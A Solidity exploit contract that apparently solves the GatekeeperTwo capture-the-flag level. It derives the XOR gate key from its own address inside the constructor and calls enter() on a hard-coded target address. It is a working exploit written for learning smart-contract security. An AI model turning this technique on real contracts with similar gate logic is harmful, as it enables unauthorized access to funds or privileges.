// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract ExploitGatekeeperTwo {
    // modifier gateThree(bytes8 _gateKey) {
    //     require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    //     _;
    // }
    constructor() {
        // address gatekeeperTwo = 0xE73E34dc58E839eF58B64B3FC81F37BC864a9065;

        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );
        // bytes memory data = abi.encodeWithSignature("enter(bytes8)", key);
        // gatekeeperTwo.call(data);

        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(
            0x25259f336A1eEBbcFFc6DABc498FF2eDfB38a056
        );
        gatekeeperTwo.enter(key);
    }
}
